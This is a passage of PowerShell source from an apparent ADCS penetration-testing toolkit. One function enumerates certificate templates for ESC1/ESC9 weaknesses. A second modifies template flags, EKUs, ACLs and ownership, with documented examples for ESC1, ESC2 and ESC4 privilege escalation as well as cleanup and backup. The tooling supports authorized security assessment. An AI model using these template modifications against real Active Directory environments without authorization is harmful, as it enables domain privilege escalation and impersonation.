            # Query via Get-DomainObject (which calls Invoke-LDAPSearch)
            Write-Log "[Get-CertificateTemplate] Querying certificate templates via Get-DomainObject"
            $Templates = Get-DomainObject @GetParams

            # Force array to prevent pipeline pollution
            $Templates = @($Templates)

            if ($Templates -and $Templates.Count -gt 0) {
                Write-Log "[Get-CertificateTemplate] Found $($Templates.Count) certificate template(s)"

                # Query CAs to build template-to-CA mapping (always, regardless of -ShowAll)
                # This map is used both for filtering published templates and for the PublishedOn property
                $TemplateCAMap = @{}
                $EnrollmentServicesBase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigNC"

                try {
                    Write-Log "[Get-CertificateTemplate] Querying Certificate Authorities for template-CA mapping"
                    $CAs = Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -SearchBase $EnrollmentServicesBase -Properties @('cn', 'certificateTemplates') -Raw

                    if ($CAs) {
                        # Build reverse map: template CN -> list of CA names
                        foreach ($CA in @($CAs)) {
                            if ($CA.certificateTemplates) {
                                $CAName = if ($CA.cn) { [string]$CA.cn } else { 'Unknown' }
                                foreach ($tmpl in @($CA.certificateTemplates)) {
                                    if (-not $TemplateCAMap.ContainsKey($tmpl)) {
                                        $TemplateCAMap[$tmpl] = [System.Collections.Generic.List[string]]::new()
                                    }
                                    $TemplateCAMap[$tmpl].Add($CAName)
                                }
                            }
                        }

                        Write-Log "[Get-CertificateTemplate] Found $($TemplateCAMap.Count) published template(s) across all CAs"

                        if (-not $ShowAll) {
                            Write-Log "[Get-CertificateTemplate] Filtering for enabled (published) templates only (use -ShowAll to see all templates)"

                            # Filter templates to only those published on at least one CA
                            $EnabledTemplates = $Templates | Where-Object { $TemplateCAMap.ContainsKey($_.cn) }

                            if ($EnabledTemplates) {
                                Write-Log "[Get-CertificateTemplate] Returning $(@($EnabledTemplates).Count) enabled template(s)"
                                $ResultTemplates = $EnabledTemplates
                            }
                            else {
                                Write-Log "[Get-CertificateTemplate] No enabled templates found (none are published to any CA)"
                                $ResultTemplates = $null
                            }
                        }
                        else {
                            Write-Log "[Get-CertificateTemplate] Returning all templates (enabled and disabled)"
                            $ResultTemplates = $Templates
                        }
                    }
                    else {
                        Write-Warning "No Certificate Authorities found. Cannot determine which templates are enabled."
                        Write-Warning "Returning all templates instead."
                        $ResultTemplates = $Templates
                    }
                }
                catch {
                    Write-Warning "Error querying CA enrollment services: $_"
                    Write-Warning "Returning all templates instead."
                    $ResultTemplates = $Templates
                }

                # Add PublishedOn property to each template (empty array for unpublished templates in -ShowAll mode)
                if ($ResultTemplates) {
                    foreach ($tmpl in @($ResultTemplates)) {
                        $caList = if ($TemplateCAMap.ContainsKey($tmpl.cn)) { @($TemplateCAMap[$tmpl.cn]) } else { @() }
                        $tmpl | Add-Member -NotePropertyName 'PublishedOn' -NotePropertyValue $caList -Force
                    }
                }

                # Apply security filters if specified
                if ($ResultTemplates -and ($EnrolleeSuppliesSubject -or $NoSecurityExtension -or $ClientAuthentication -or $ExportableKey -or $NoManagerApproval -or $EnrollmentAllowed)) {
                    Write-Log "[Get-CertificateTemplate] Applying security filters"

                    $FilteredTemplates = $ResultTemplates

                    # Filter: ENROLLEE_SUPPLIES_SUBJECT (ESC1 indicator)
                    if ($EnrolleeSuppliesSubject) {
                        Write-Log "[Get-CertificateTemplate] Filtering for ENROLLEE_SUPPLIES_SUBJECT"
                        $FilteredTemplates = $FilteredTemplates | Where-Object {
                            # Support both raw (integer) and converted (string array) values
                            if ($_.'msPKI-Certificate-Name-Flag' -is [int]) {
                                # Raw value: 0x00000001 = ENROLLEE_SUPPLIES_SUBJECT
                                ([int]$_.'msPKI-Certificate-Name-Flag') -band 0x00000001
                            } else {
                                # Converted value: Array contains string
                                $_.'msPKI-Certificate-Name-Flag' -contains 'ENROLLEE_SUPPLIES_SUBJECT'
                            }
                        }
                    }

                    # Filter: NO_SECURITY_EXTENSION (ESC9 indicator)
                    if ($NoSecurityExtension) {
                        Write-Log "[Get-CertificateTemplate] Filtering for NO_SECURITY_EXTENSION"
                        $FilteredTemplates = $FilteredTemplates | Where-Object {
                            # Support both raw (integer) and converted (string array) values
                            if ($_.'msPKI-Enrollment-Flag' -is [int]) {
                                # Raw value: 0x00080000 = CT_FLAG_NO_SECURITY_EXTENSION
                                ([int]$_.'msPKI-Enrollment-Flag') -band 0x00080000
                            } else {
                                # Converted value: Array contains string
                                $_.'msPKI-Enrollment-Flag' -contains 'NO_SECURITY_EXTENSION'
                            }
                        }
                    }

                    # Filter: Client Authentication EKU
                    if ($ClientAuthentication) {
                        Write-Log "[Get-CertificateTemplate] Filtering for Client Authentication EKU"
                        $FilteredTemplates = $FilteredTemplates | Where-Object {
                            # Client Auth OID: 1.3.6.1.5.5.7.3.2
                            # Check both pKIExtendedKeyUsage and msPKI-Certificate-Application-Policy
                            # Support both raw (string) and converted (string with friendly name) values
                            ($_.pKIExtendedKeyUsage -match '1\.3\.6\.1\.5\.5\.7\.3\.2') -or
                            ($_.'msPKI-Certificate-Application-Policy' -match '1\.3\.6\.1\.5\.5\.7\.3\.2')
                        }
                    }

                    # Filter: EXPORTABLE_KEY
                    if ($ExportableKey) {
                        Write-Log "[Get-CertificateTemplate] Filtering for EXPORTABLE_KEY"
                        $FilteredTemplates = $FilteredTemplates | Where-Object {
                            # Support both raw (integer) and converted (string array) values
                            if ($_.'msPKI-Private-Key-Flag' -is [int]) {
                                # Raw value: 0x00000010 = EXPORTABLE_KEY
                                ([int]$_.'msPKI-Private-Key-Flag') -band 0x00000010
                            } else {
                                # Converted value: Array contains string
                                $_.'msPKI-Private-Key-Flag' -contains 'EXPORTABLE_KEY'
                            }
                        }
                    }

                    # Filter: No Manager Approval Required
                    if ($NoManagerApproval) {
                        Write-Log "[Get-CertificateTemplate] Filtering for templates without manager approval"
                        $FilteredTemplates = $FilteredTemplates | Where-Object {
                            # Support both raw (integer) and converted (string array) values
                            if ($_.'msPKI-Enrollment-Flag' -is [int]) {
                                # Raw value: 0x00000002 = PEND_ALL_REQUESTS (manager approval required)
                                # We want templates WITHOUT this flag (i.e., flag NOT set)
                                -not (([int]$_.'msPKI-Enrollment-Flag') -band 0x00000002)
                            } else {
                                # Converted value: Array does NOT contain string
                                $_.'msPKI-Enrollment-Flag' -notcontains 'PEND_ALL_REQUESTS'
                            }
                        }
                    }

                    # Filter: Enrollment Allowed (check nTSecurityDescriptor for enrollment rights)
                    if ($EnrollmentAllowed) {
                        Write-Log "[Get-CertificateTemplate] Filtering for templates with enrollment permissions"
                        $FilteredTemplates = $FilteredTemplates | Where-Object {
                            if ($_.nTSecurityDescriptor) {
                                # Support both raw (byte array) and converted (string array) values
                                if ($_.nTSecurityDescriptor -is [byte[]]) {
                                    # Raw value: Parse Security Descriptor bytes for Certificate-Enrollment GUID
                                    # Certificate-Enrollment: 0e10c968-78fb-11d2-90d4-00c04f79dc55
                                    # Convert GUID to byte pattern and search in SD
                                    $SD = New-Object System.DirectoryServices.ActiveDirectorySecurity
                                    $SD.SetSecurityDescriptorBinaryForm($_.nTSecurityDescriptor)

                                    # Check for Certificate-Enrollment extended right
                                    $CertEnrollGuid = [Guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                                    $AllExtendedRightsGuid = [Guid]"00000000-0000-0000-0000-000000000000"

                                    $SD.Access | Where-Object {
                                        $_.AccessControlType -eq 'Allow' -and
                                        ($_.ObjectType -eq $CertEnrollGuid -or $_.ObjectType -eq $AllExtendedRightsGuid)
                                    }
                                } else {
                                    # Converted value: Array of formatted strings like:
                                    # "Allow - NT-AUTHORITY\Authenticated Users - ExtendedRight (Certificate-Enrollment)"
                                    $SDLines = $_.nTSecurityDescriptor
                                    # Check for Certificate-Enrollment or All-Extended-Rights in any ACE line
                                    ($SDLines -match 'Certificate-Enrollment' -or
                                     $SDLines -match 'Certificate-AutoEnrollment' -or
                                     $SDLines -match 'All-Extended-Rights').Count -gt 0
                                }
                            } else {
                                $false
                            }
                        }
                    }

                    if ($FilteredTemplates) {
                        Write-Log "[Get-CertificateTemplate] Filter applied: $($FilteredTemplates.Count) template(s) match criteria"

                        # Filter output properties if user specified custom properties
                        if ($Properties) {
                            # User wants specific properties - return only cn + PublishedOn + requested properties
                            $OutputProperties = @('cn', 'PublishedOn') + $Properties | Select-Object -Unique
                            return $FilteredTemplates | Select-Object $OutputProperties
                        } else {
                            return $FilteredTemplates
                        }
                    }
                    else {
                        Write-Log "[Get-CertificateTemplate] No templates match the specified filter criteria"
                        return $null
                    }
                }
                else {
                    # No filters applied - return templates as-is
                    # Filter output properties if user specified custom properties
                    if ($Properties) {
                        $OutputProperties = @('cn', 'PublishedOn') + $Properties
                        $UniqueProperties = @()
                        $SeenProperties = @{}
                        foreach ($prop in $OutputProperties) {
                            $propLower = $prop.ToLower()
                            if (-not $SeenProperties.ContainsKey($propLower)) {
                                $UniqueProperties += $prop
                                $SeenProperties[$propLower] = $true
                            }
                        }
                        $ResultTemplates = $ResultTemplates | Select-Object $UniqueProperties
                    }
                }

                # Export templates to JSON if -Export specified
                if ($Export) {
                    Write-Log "[Get-CertificateTemplate] Exporting template(s) to JSON"

                    # Determine export path (filename sanitization handled by Export-adPEASFile)
                    if (-not $ExportPath) {
                        $Timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
                        if ($ResultTemplates.Count -eq 1) {
                            $TemplateName = $ResultTemplates[0].cn
                            $ExportPath = "CertTemplate_${TemplateName}_${Timestamp}.json"
                        } else {
                            $ExportPath = "CertTemplates_${Timestamp}.json"
                        }
                    }

                    # Prepare templates for export
                    $ExcludedAttributes = @(
                        'ntsecuritydescriptor',
                        'objectguid',
                        'whencreated',
                        'whenchanged'
                    )

                    $ExportData = @()
                    foreach ($template in $ResultTemplates) {
                        # Re-query template with ALL attributes (*) to ensure complete backup, $template only contains the ~30 properties we explicitly loaded
                        Write-Log "[Get-CertificateTemplate] Re-querying template '$($template.cn)' with all attributes for export"

                        $FullTemplateParams = @{
                            LDAPFilter = "(cn=$($template.cn))"
                            SearchBase = $SearchBase
                            Properties = @('*')  # Load ALL attributes
                            Raw = $true          # Raw values for restore
                        }
                        if ($Domain) { $FullTemplateParams['Domain'] = $Domain }
                        if ($Server) { $FullTemplateParams['Server'] = $Server }
                        if ($Credential) { $FullTemplateParams['Credential'] = $Credential }

                        $FullTemplate = @(Get-DomainObject @FullTemplateParams)[0]

                        if (-not $FullTemplate) {
                            Write-Warning "[Get-CertificateTemplate] Failed to re-query template '$($template.cn)' for export"
                            continue
                        }

                        $ExportObject = [ordered]@{}

                        # Copy all properties except excluded ones
                        $FullTemplate.PSObject.Properties | Where-Object {
                            $ExcludedAttributes -notcontains $_.Name.ToLower()
                        } | ForEach-Object {
                            $ExportObject[$_.Name] = $_.Value
                        }

                        $ExportData += $ExportObject
                    }

                    # Create export metadata
                    $ExportFile = @{
                        ExportedAt = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        ExportedBy = "$env:USERDOMAIN\$env:USERNAME"
                        Domain = $Script:LDAPContext.Domain
                        TemplateCount = $ExportData.Count
                        Templates = $ExportData
                    }

                    # Export to JSON using central helper function
                    $exportResult = Export-adPEASFile -Path $ExportPath -Content $ExportFile -Type Json -SanitizeFilename

                    if ($exportResult.Success) {
                        Write-Log "[Get-CertificateTemplate] Successfully exported $($ExportData.Count) template(s) to: $($exportResult.Path)"
                    } else {
                        Write-Error "Failed to export templates: $($exportResult.Message)"
                    }
                }

                return $ResultTemplates
            }
            else {
                Write-Log "[Get-CertificateTemplate] No certificate templates found"
                return $null
            }
        }
        catch {
            Write-Log "[Get-CertificateTemplate] Error querying certificate templates: $_"
            Write-Log "[Get-CertificateTemplate] Exception details: $($_.Exception.Message)"

            # Return error marker object so caller knows query failed vs. no templates found
            [PSCustomObject]@{
                _QueryError = $true
                ErrorMessage = $_.Exception.Message
            }
        }
    }

    end {
        Write-Log "[Get-CertificateTemplate] Certificate template enumeration complete"
    }
}



# ----- Set-CertificateTemplate.ps1 -----

function Set-CertificateTemplate {
<#
.SYNOPSIS
    Modifies Certificate Template properties for Active Directory Certificate Services (ADCS).

.DESCRIPTION
    Allows modification of certificate template properties and permissions.
    Designed for penetration testing scenarios including ESC1, ESC4, and template exploitation.

    Common Use Cases:
    - ESC1: Configure template for privilege escalation (EnrolleeSuppliesSubject + Client Auth)
    - ESC4: Grant enrollment permissions to low-privileged accounts
    - Template Publishing: Enable/disable templates on Certificate Authorities
    - Cleanup: Revert changes after testing

.PARAMETER Identity
    Template name or distinguished name to modify.
    Examples: "WebServer", "CN=WebServer,CN=Certificate Templates,..."

.PARAMETER AllowEnrolleeSuppliesSubject
    Enable ENROLLEE_SUPPLIES_SUBJECT flag (ESC1 indicator).
    Allows enrollee to specify arbitrary Subject/SAN in certificate request.

.PARAMETER AddClientAuthentication
    Add Client Authentication EKU (1.3.6.1.5.5.7.3.2) to template.
    Required for Kerberos authentication and privilege escalation.

.PARAMETER AllowExportableKey
    Enable EXPORTABLE_KEY flag in msPKI-Private-Key-Flag.
    Allows private key export after enrollment.

.PARAMETER RemoveManagerApproval
    Remove PEND_ALL_REQUESTS flag from msPKI-Enrollment-Flag.
    Bypasses CA manager approval requirement.

.PARAMETER GrantEnrollment
    Grant Certificate-Enrollment extended right to specified principal.
    Example: -GrantEnrollment "CONTOSO\LowPrivUser"

.PARAMETER GrantFullControl
    Grant GenericAll (full control) to specified principal.
    Example: -GrantFullControl "CONTOSO\AttackerGroup"

.PARAMETER GrantWrite
    Grant WriteProperty permission to specified principal.
    Allows further template modifications.

.PARAMETER RevokeEnrollment
    Remove Certificate-Enrollment extended right from specified principal.
    Used for cleanup after testing.

.PARAMETER DisableEnrolleeSuppliesSubject
    Remove ENROLLEE_SUPPLIES_SUBJECT flag from msPKI-Certificate-Name-Flag.
    Restores default subject name handling (CA supplies subject from AD).
    Used for cleanup after ESC1 testing.

.PARAMETER AddManagerApproval
    Add PEND_ALL_REQUESTS flag to msPKI-Enrollment-Flag.
    Requires CA manager approval for all certificate requests.
    Used for cleanup after ESC1 testing.

.PARAMETER RemoveEKU
    Remove specific Extended Key Usage OID from template.
    Example: -RemoveEKU "1.3.6.1.5.5.7.3.2" (removes Client Authentication)

.PARAMETER AddAnyPurposeEKU
    Add Any Purpose EKU (2.5.29.37.0) to template.
    This EKU allows the certificate to be used for any purpose (ESC2).

.PARAMETER ClearEKUs
    Remove ALL Extended Key Usages from template.
    A template with no EKUs allows any purpose (ESC2 variant).

.PARAMETER AddSmartcardLogon
    Add Smartcard Logon EKU (1.3.6.1.4.1.311.20.2.2) to template.
    Required for PKINIT authentication against Active Directory.

.PARAMETER SetOwner
    Change the owner of the certificate template object.
    Example: -SetOwner "CONTOSO\AdminUser"

.PARAMETER GrantAutoEnroll
    Grant Certificate-AutoEnrollment extended right to specified principal.
    Allows automatic certificate enrollment via Group Policy.
    Example: -GrantAutoEnroll "CONTOSO\Domain Computers"

.PARAMETER Export
    Export template configuration to JSON file for backup/restore.
    Example: -Export "C:\Backup\WebServer_backup.json"

.PARAMETER Domain
    Target domain (FQDN). Optional - uses current domain if not specified.

.PARAMETER Server
    Target domain controller. Optional - uses automatic DC discovery.

.PARAMETER Credential
    PSCredential object for authentication.

.EXAMPLE
    # ESC1: Configure template for privilege escalation
    Set-CertificateTemplate -Identity "WebServer" `
        -AllowEnrolleeSuppliesSubject `
        -AddClientAuthentication `
        -AllowExportableKey

.EXAMPLE
    # ESC4: Grant enrollment to low-privileged account
    Set-CertificateTemplate -Identity "DomainController" `
        -GrantEnrollment "CONTOSO\LowPrivUser"

.EXAMPLE
    # Cleanup: Revoke enrollment permissions
    Set-CertificateTemplate -Identity "WebServer" `
        -RevokeEnrollment "CONTOSO\TestUser"

.EXAMPLE
    # Cleanup: Revert ESC1 changes
    Set-CertificateTemplate -Identity "WebServer" `
        -DisableEnrolleeSuppliesSubject `
        -AddManagerApproval

.EXAMPLE
    # ESC2: Add Any Purpose EKU
    Set-CertificateTemplate -Identity "User" `
        -AddAnyPurposeEKU

.EXAMPLE
    # Add Smartcard Logon for PKINIT
    Set-CertificateTemplate -Identity "SmartcardUser" `
        -AddSmartcardLogon

.EXAMPLE
    # Remove specific EKU
    Set-CertificateTemplate -Identity "WebServer" `
        -RemoveEKU "1.3.6.1.5.5.7.3.1"

.EXAMPLE
    # Grant Auto-Enrollment permission
    Set-CertificateTemplate -Identity "Workstation" `
        -GrantAutoEnroll "CONTOSO\Domain Computers"

.EXAMPLE
    # Take ownership of template
    Set-CertificateTemplate -Identity "WebServer" `
        -SetOwner "CONTOSO\AttackerUser"

.EXAMPLE
    # Backup template before modification
    Set-CertificateTemplate -Identity "WebServer" `
        -Export "C:\Backup\WebServer_backup.json"

.OUTPUTS
    PSCustomObject with modification results

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Low')]
    [OutputType([System.Management.Automation.PSCustomObject])]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [Alias('Name')]
        [string]$Identity,

        # ESC1 Configuration - Flag Modifications
        [Parameter(Mandatory=$false)]
        [switch]$AllowEnrolleeSuppliesSubject,

        [Parameter(Mandatory=$false)]
        [switch]$AddClientAuthentication,

        [Parameter(Mandatory=$false)]
        [switch]$AllowExportableKey,

        [Parameter(Mandatory=$false)]
        [switch]$RemoveManagerApproval,

        # ESC4 - ACL Modifications
        [Parameter(Mandatory=$false)]
        [string]$GrantEnrollment,

        [Parameter(Mandatory=$false)]
        [string]$GrantFullControl,

        [Parameter(Mandatory=$false)]
        [string]$GrantWrite,

        [Parameter(Mandatory=$false)]
        [string]$RevokeEnrollment,

        # Cleanup/Revert Parameters (ESC1 Cleanup)
        [Parameter(Mandatory=$false)]
        [switch]$DisableEnrolleeSuppliesSubject,

        [Parameter(Mandatory=$false)]
        [switch]$AddManagerApproval,

        # EKU Manipulation Parameters
        [Parameter(Mandatory=$false)]
        [string]$RemoveEKU,

        [Parameter(Mandatory=$false)]
        [switch]$AddAnyPurposeEKU,

        [Parameter(Mandatory=$false)]
        [switch]$ClearEKUs,

        [Parameter(Mandatory=$false)]
        [switch]$AddSmartcardLogon,

        # Advanced ACL Parameters
        [Parameter(Mandatory=$false)]
        [string]$SetOwner,

        [Parameter(Mandatory=$false)]
        [string]$GrantAutoEnroll,

        # Export/Backup
        [Parameter(Mandatory=$false)]
        [string]$Export,

        # Import/Restore from Backup
        [Parameter(Mandatory=$false)]
        [string]$Import,

        # Connection Parameters
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential
    )

    begin {
        Write-Log "[Set-CertificateTemplate] Starting certificate template modification"

        # Track modifications for result reporting
        $Modifications = @()
    }

    process {
        # Ensure LDAP connection at start of process block
        $ConnectionParams = @{}
        if ($PSBoundParameters.ContainsKey('Domain')) { $ConnectionParams['Domain'] = $Domain }
        if ($PSBoundParameters.ContainsKey('Server')) { $ConnectionParams['Server'] = $Server }
        if ($PSBoundParameters.ContainsKey('Credential')) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            return [PSCustomObject]@{
                Operation = "ModifyCertificateTemplate"
                Template = $Identity
                Success = $false
                Message = "No LDAP connection available"
            }
        }

        try {
            # IMPORT MODE: Restore template(s) from JSON backup
            if ($Import) {
                Write-Log "[Set-CertificateTemplate] Importing template(s) from: $Import"

                # Validate import file exists and is a file (not directory)
                if (-not (Test-Path -Path $Import -PathType Leaf)) {
                    throw "Import file not found or is a directory: $Import"
                }

                # Load JSON backup
                try {
                    $ImportData = Get-Content -Path $Import -Raw | ConvertFrom-Json
                }
                catch {
                    throw "Failed to parse import file (invalid JSON): $_"
                }

                # Validate JSON structure
                if (-not $ImportData.Templates) {
                    throw "Invalid import file format: Missing 'Templates' array"
                }

                Write-Log "[Set-CertificateTemplate] Import file contains $($ImportData.TemplateCount) template(s)"

                # Get Configuration NC for SearchBase
                $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext
                $TemplatesBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"

                $RestoredCount = 0
                $FailedCount = 0

                foreach ($BackupTemplate in $ImportData.Templates) {
                    try {
                        $TemplateName = $BackupTemplate.cn
                        Write-Log "[Set-CertificateTemplate] Restoring template: $TemplateName"

                        # Load ALL attributes from backup (not just default 30 properties!)
                        # Get list of all exported attributes to compare
                        $BackupAttributeNames = @($BackupTemplate.PSObject.Properties | ForEach-Object { $_.Name })

                        # Add required properties for identification (if not already in backup)
                        $RequiredProperties = @('cn', 'displayName', 'distinguishedName')
                        $AllProperties = @($BackupAttributeNames) + $RequiredProperties | Select-Object -Unique

                        Write-Log "[Set-CertificateTemplate] Backup contains $($BackupAttributeNames.Count) attributes, loading $($AllProperties.Count) total properties"

                        # Query template with all backup attributes + required properties
                        $ExistingTemplate = @(Get-CertificateTemplate -Identity $TemplateName -ShowAll -Raw -Properties $AllProperties)[0]
                        if (-not $ExistingTemplate) {
                            Write-Warning "[!] Template '$TemplateName' does not exist in AD - skipping"
                            $FailedCount++
                            continue
                        }

                        $TemplateDN = $ExistingTemplate.distinguishedName

                        # Build hashtable of attributes to restore
                        $RestoreAttributes = @{}
                        $ExcludedAttributes = @(
                            'cn',                        # Identity, not restorable
                            'name',                      # Usually same as cn, system-managed
                            'distinguishedname',         # Identity, not restorable
                            'objectguid',                # System-generated
                            'objectcategory',            # System-generated
                            'objectclass',               # System-generated
                            'instancetype',              # System-generated
                            'whencreated',               # System-generated timestamp
                            'whenchanged',               # System-generated timestamp
                            'dscorepropagationdata',     # System-generated replication metadata
                            'usncreated',                # System-generated USN
                            'usnchanged',                # System-generated USN
                            'ntsecuritydescriptor',      # ACLs handled separately
                            'pkiexpirationperiod',       # Binary attribute, cannot restore via JSON
                            'pkioverlapperiod',          # Binary attribute, cannot restore via JSON
                            'pkidefaultkeyspec',         # Converted value, restore raw instead
                            'pkikeyusage',               # Converted value, restore raw instead
                            'revision',                  # Auto-incremented, don't restore old value
                            'showinadvancedviewonly'     # UI-specific, not critical
                        )

                        $BackupTemplate.PSObject.Properties | Where-Object {
                            $ExcludedAttributes -notcontains $_.Name.ToLower() -and $null -ne $_.Value
                        } | ForEach-Object {
                            $AttributeName = $_.Name
                            $BackupValue = $_.Value

                            # Get current value from existing template
                            $CurrentValue = $ExistingTemplate.$AttributeName

                            # Compare values - only restore if different
                            $ValuesMatch = $false

                            if ($null -eq $CurrentValue -and $null -eq $BackupValue) {
                                $ValuesMatch = $true
                            }
                            elseif ($null -eq $CurrentValue -or $null -eq $BackupValue) {
                                $ValuesMatch = $false
                            }
                            elseif ($BackupValue -is [System.Array] -and $CurrentValue -is [System.Array]) {
                                # Array comparison - check if same elements
                                if ($BackupValue.Count -eq $CurrentValue.Count) {
                                    $ValuesMatch = $true
                                    for ($i = 0; $i -lt $BackupValue.Count; $i++) {
                                        if ($BackupValue[$i] -ne $CurrentValue[$i]) {
                                            $ValuesMatch = $false
                                            break
                                        }
                                    }
                                }
                            }
                            else {
                                # Scalar comparison
                                $ValuesMatch = ($BackupValue -eq $CurrentValue)
                            }

                            # Only add to restore list if values differ
                            if (-not $ValuesMatch) {
                                Write-Log "[Set-CertificateTemplate]   Attribute '$AttributeName' differs - will restore (Current: $CurrentValue, Backup: $BackupValue)"

                                # Convert JSON arrays to proper PowerShell arrays
                                $AttributeValue = $BackupValue
                                if ($AttributeValue -is [System.Array]) {
                                    $AttributeValue = [string[]]@($AttributeValue)
                                }
                                $RestoreAttributes[$AttributeName] = $AttributeValue
                            }
                            else {
                                Write-Log "[Set-CertificateTemplate]   Attribute '$AttributeName' unchanged - skipping"
                            }
                        }

                        if ($RestoreAttributes.Count -eq 0) {
                            Show-Line "Template '$TemplateName' already matches backup - no changes needed" -Class Note
                            continue
                        }

                        Write-Log "[Set-CertificateTemplate] Restoring $($RestoreAttributes.Count) changed attribute(s): $($RestoreAttributes.Keys -join ', ')"

                        # Restore attributes using Set-DomainObject
                        if ($PSCmdlet.ShouldProcess($TemplateName, "Restore template from backup")) {
                            try {
                                $null = Set-DomainObject -Identity $TemplateDN -Set $RestoreAttributes -SearchBase $TemplatesBase -ErrorAction Stop
                                # Success - increment counter and show message
                                $RestoredCount++
                                Show-Line "Successfully restored template: $TemplateName ($($RestoreAttributes.Count) attributes)" -Class Hint
                            }
                            catch {
                                Write-Warning "[!] Failed to restore template '$TemplateName': $($_.Exception.Message)"
                                $FailedCount++
                            }
                        }
                    }
                    catch {
                        Write-Warning "[!] Error processing template '$TemplateName': $($_.Exception.Message)"
                        $FailedCount++
                    }
                }

                # Return nothing - all output already shown via Show-Line/Show-Object
                return
            }

            # EXPORT MODE: Export template to JSON backup
            if ($Export) {
                Write-Log "[Set-CertificateTemplate] Exporting template '$Identity' to: $Export"

                # Get Configuration NC for SearchBase
                $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext
                $TemplatesBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"

                # Find template with all properties for complete backup
                $TemplateInfo = @(Get-CertificateTemplate -Identity $Identity -ShowAll -Raw)[0]
                if (-not $TemplateInfo) {
                    throw "Certificate template '$Identity' not found"
                }

                $TemplateName = $TemplateInfo.cn

                # Build export object with all relevant properties
                $ExportData = [ordered]@{
                    ExportDate = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                    ExportedBy = "$env:USERDOMAIN\$env:USERNAME"
                    TemplateCount = 1
                    Templates = @(
                        $TemplateInfo
                    )
                }

                try {
                    $ExportData | ConvertTo-Json -Depth 10 | Set-Content -Path $Export -Encoding UTF8 -ErrorAction Stop
                    Show-Line "Successfully exported template '$TemplateName' to: $Export" -Class Hint
                }
                catch {
                    throw "Failed to write export file: $_"
                }

                return
            }

            # MODIFICATION MODE: Normal template modifications, check if at least one modification parameter was provided
            $ModificationParams = @(
                'AllowEnrolleeSuppliesSubject',
                'AddClientAuthentication',
                'AllowExportableKey',
                'RemoveManagerApproval',
                'GrantEnrollment',
                'GrantFullControl',
                'GrantWrite',
                'RevokeEnrollment',
                # Cleanup/Revert Parameters
                'DisableEnrolleeSuppliesSubject',
                'AddManagerApproval',
                # EKU Manipulation
                'RemoveEKU',
                'AddAnyPurposeEKU',
                'ClearEKUs',
                'AddSmartcardLogon',
                # Advanced ACL
                'SetOwner',
                'GrantAutoEnroll'
            )

            $HasModification = $false
            foreach ($param in $ModificationParams) {
                if ($PSBoundParameters.ContainsKey($param)) {
                    $HasModification = $true
                    break
                }
            }

            if (-not $HasModification) {
                # No modification parameters provided - show helpful usage examples
                Show-NoParametersError -FunctionName "Set-CertificateTemplate"
                return $null
            }

            Write-Log "[Set-CertificateTemplate] Searching for template: $Identity"

            # Get Configuration NC for SearchBase
            $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext
            $TemplatesBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"

            # Find template by name or DN using Get-CertificateTemplate (which uses Get-DomainObject)
            # -ShowAll: Include unpublished templates, -Raw: Get raw integer values for flag manipulation
            $TemplateInfo = @(Get-CertificateTemplate -Identity $Identity -ShowAll -Raw)[0]
            if (-not $TemplateInfo) {
                throw "Certificate template '$Identity' not found"
            }

            $TemplateDN = $TemplateInfo.distinguishedName
            $TemplateName = $TemplateInfo.cn
            Write-Log "[Set-CertificateTemplate] Found template: $TemplateName ($TemplateDN)"

            # --- Write permission pre-check ---
            # Test write access before making modifications to fail early with a clear message.
            # We test by writing the current revision value back (no-op change).
            $HasAnyModification = ($AllowEnrolleeSuppliesSubject -or $AllowExportableKey -or $RemoveManagerApproval -or
                $DisableEnrolleeSuppliesSubject -or $AddManagerApproval -or $AddClientAuthentication -or
                $RemoveClientAuthentication -or $RemoveEKU -or $AddAnyPurposeEKU -or $ClearEKUs -or
                $AddSmartcardLogon -or $GrantEnrollment -or $GrantFullControl -or $GrantWrite -or
                $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll)

            if ($HasAnyModification) {
                Write-Log "[Set-CertificateTemplate] Testing write permissions on template"
                $CurrentRevision = if ($TemplateInfo.revision) { [int]$TemplateInfo.revision } else { 0 }
                $writeTest = Set-DomainObject -Identity $TemplateDN -Set @{'revision' = $CurrentRevision} -SearchBase $TemplatesBase -ErrorAction SilentlyContinue
                if ($writeTest -eq $false) {
                    throw "Insufficient permissions to modify template '$TemplateName'. Ensure the current user has Write access to the certificate template object."
                }
                Write-Log "[Set-CertificateTemplate] Write permission check passed"
            }

            # ESC1 Flag Modifications
            if ($AllowEnrolleeSuppliesSubject) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Enable ENROLLEE_SUPPLIES_SUBJECT flag") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Setting ENROLLEE_SUPPLIES_SUBJECT flag"

                    # Get current flag value (raw integer from Get-CertificateTemplate -Raw)
                    $CurrentFlags = if ($TemplateInfo.'msPKI-Certificate-Name-Flag') {
                        [int]$TemplateInfo.'msPKI-Certificate-Name-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Certificate-Name-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    # ENROLLEE_SUPPLIES_SUBJECT is an EXCLUSIVE flag!
                    # When set, all other msPKI-Certificate-Name-Flag values are irrelevant and should be cleared.
                    # This matches the behavior of the ADCS GUI - setting this flag replaces all other subject name flags.
                    $NewFlags = 0x00000001  # ENROLLEE_SUPPLIES_SUBJECT only (clear all other flags)
